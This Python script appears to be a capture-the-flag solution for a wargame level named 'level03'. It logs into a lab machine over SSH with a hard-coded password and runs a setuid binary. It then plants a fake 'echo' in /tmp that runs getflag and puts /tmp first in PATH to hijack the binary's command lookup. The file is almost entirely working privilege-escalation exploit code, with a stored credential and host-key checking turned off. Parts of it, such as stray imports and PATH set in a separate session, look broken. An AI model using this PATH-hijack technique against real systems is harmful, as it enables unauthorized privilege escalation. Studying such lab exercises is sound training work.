"""
    Injection in pipe of processes. It need to do again after reboot system.
"""

from asyncio import streams
from sys import stdout
from tkinter import N, Y
import paramiko

host = '192.168.64.3'#input("\033[92mEnter IP address of remote machine and press Return:\033[0m")
username = 'level03'
password = 'kooda2puivaav1idi4f57q8iq'

def free(ssh_stdin, ssh_stdout, ssh_stderr):
    del ssh_stdin, ssh_stdout, ssh_stderr

# start ssh client
ssh = paramiko.SSHClient()
if ssh is not None:
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host,username=username,password=password,port=4242)

    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('ls')
    filename = ssh_stdout.readlines()[0][0:-1]
    print (f"\033[95m", '\n', f"""Content of user's home directory:\n
#             \033[96m {filename}\n\n Here it is! Just need some hack!\n""", "\033[0m")
    free(ssh_stdin, ssh_stdout, ssh_stderr)

    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('./level03')
    print(f"Executed {filename}, result: \033[96m{ssh_stdout.readlines()[0][0:-1]}\n\033[0m")
    free(ssh_stdin, ssh_stdout, ssh_stderr)

    ssh.exec_command("""echo getflag > /tmp/echo && chmod +x /tmp/echo; 
                        export PATH=/tmp:$PATH && echo $PATH""")
    
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('./level03')
    print(f"Executed {filename}, again, result: \033[96m{ssh_stdout.readlines()[0][0:-1]} \nif it the same, so try to start it on host machine\n\033[0m")
    free(ssh_stdin, ssh_stdout, ssh_stderr)

    ssh.close()

   